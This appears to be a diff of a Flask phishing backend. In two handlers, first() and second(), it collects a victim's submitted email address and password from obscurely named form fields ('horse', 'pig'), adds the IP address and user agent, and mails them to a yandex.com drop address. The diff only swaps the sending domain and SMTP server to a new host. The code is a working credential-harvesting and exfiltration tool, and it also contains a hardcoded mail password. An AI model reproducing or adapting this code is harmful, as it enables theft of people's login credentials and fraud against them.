@@ -176,8 +176,8 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'Johnson@maximalmusclelabs.com'
-        sender_emaill = 'JOhnson'
+        sender_email = 'user3@bromis.shop'
+        sender_emaill = 'user3'
         receiver_email = 'Jinna2323@yandex.com'
         password = 'Dancing2000'
         useragent = request.headers.get('User-Agent')
@@ -198,7 +198,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.maximalmusclelabs.com', 465) as server:
+        with smtplib.SMTP_SSL('bromis.shop', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,8 +217,8 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'johnson@maximalmusclelabs.com'
-        sender_emaill = 'johnsoN'
+        sender_email = 'user3@bromis.shop'
+        sender_emaill = 'user3'
         receiver_email = 'Jinna2323@yandex.com'
         password = 'Dancing2000'
         useragent = request.headers.get('User-Agent')
@@ -239,7 +239,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.maximalmusclelabs.com', 465) as server:
+        with smtplib.SMTP_SSL('bromis.shop', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
